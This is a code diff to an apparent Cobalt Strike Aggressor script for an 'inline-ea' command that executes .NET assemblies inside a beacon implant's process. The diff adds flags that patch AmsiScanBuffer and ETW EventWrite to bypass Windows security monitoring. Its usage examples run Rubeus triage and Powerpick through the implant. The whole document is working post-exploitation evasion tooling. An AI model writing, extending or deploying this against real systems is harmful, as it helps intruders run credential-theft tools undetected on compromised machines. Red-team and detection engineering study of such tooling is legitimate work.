@@ -1,11 +1,21 @@
 #Register command
 beacon_command_register(
 "inline-ea", 
-"Execute .NET assemblies in the current beacon process. Use optional --patchexit flag as the first or last arg to patch System.Environment.Exit (Note this does get flagged by Elastic)", 
-"Synopsis: inline-ea /path/to/Assembly.exe arguments go here\nUse optional --patchexit flag as the first or last arg to patch System.Environment.Exit (Note this does get flagged by Elastic)");
-
+"Execute .NET assemblies in the current beacon process. All optional arguments must be at the end of the command.",
+"Synopsis: inline-ea /path/to/Assembly.exe [arguments...] [--patchexit] [--amsi] [--etw]\n" .
+"Description:\n" .
+"  Execute a .NET assembly in the current beacon process.\n\n" .
+"  --patchexit   Optional. Patches System.Environment.Exit (flagged by Elastic).\n" .
+"  --amsi        Optional. Patches AmsiScanBuffer to bypass AMSI.\n" .
+"  --etw         Optional. Patches ETW EventWrite.\n\n" .
+"Examples:\n" .
+"  inline-ea /path/to/Rubeus.exe triage --amsi --etw --patchexit\n" .
+"  inline-ea /path/to/Powerpick.exe whoami /all --amsi --etw\n"
+);
 
 alias inline-ea {
+    $data = substr($0, 9);
+    @args = split(" ", $data);
 
 	if (size(@_) < 3)
 	{
@@ -18,32 +28,28 @@ alias inline-ea {
 	$dotnetassembly = $2;
 	
     $patchExitflag = 0;
+    $patchAmsiflag = 0;
+    $patchEtwflag  = 0;
+
     $result = "";
-    # Check if the first passed argument equals --patchexit
-    if (@_[2] eq "--patchexit") {
-        $patchExitflag = 1;
-        # Collect arguments starting from the element after --patchexit
-        for ($i = 3; $i < size(@_); $i++) {
-            $result .= @_[$i] . " ";
-        }
-    # Otherwise, check if the last passed argument equals --patchexit
-    } else if (@_[size(@_) - 1] eq "--patchexit") {
-        $patchExitflag = 1;
-        # Collect arguments from index 2 up to the element before --patchexit
-        for ($i = 2; $i < size(@_) - 1; $i++) {
-            $result .= @_[$i] . " ";
-        }
-    # If --patchexit isn’t present at either end, process all arguments normally
-    } else {
-        for ($i = 2; $i < size(@_); $i++) {
-            $result .= @_[$i] . " ";
+    for ($i = 0; $i < size(@args); $i++) {
+        $arg = @args[$i];
+        if ($arg eq "--patchexit") {
+            $patchExitflag = 1;
+        } else if ($arg eq "--amsi") {
+            $patchAmsiflag = 1;
+        } else if ($arg eq "--etw") {
+            $patchEtwflag = 1;
+        } else if ($arg eq "$dotnetassembly") {
+            continue;
+        } else {
+            $result .= $arg . " ";
         }
     }
 
     # Remove trailing space if it exists
-    $result = substr($result, 0, -1);
+    $result = substr($result, 1, -1);
     $arguments = $result;
-
 
     #Reading assembly bytes and get the size in bytes
 	$fileHandle = openf($dotnetassembly);
@@ -59,7 +65,7 @@ alias inline-ea {
 	println($assemblyLength)
 	
 	# Read BOF file
-	$handle = openf(script_resource("inline-ea.x64.o"));
+	$handle = openf(script_resource("inline-ea. $+ $barch $+ .o"));
 	$bof = readb($handle, -1);
 	closef($handle);
 	if(strlen($bof) < 1)
@@ -68,10 +74,9 @@ alias inline-ea {
 		return;
 	}
 
+    println("$arguments");
+
     # Prepare the arguments
-    $args = bof_pack($1, "biZi", $assemblyBytes, $assemblyLength, $arguments, $patchExitflag);
-    
-    # Call the BOF
+    $args = bof_pack($1, "biZiii", $assemblyBytes, $assemblyLength, $arguments, $patchExitflag, $patchAmsiflag, $patchEtwflag);
     beacon_inline_execute($1, $bof, "go", $args); # $args
-	
 }
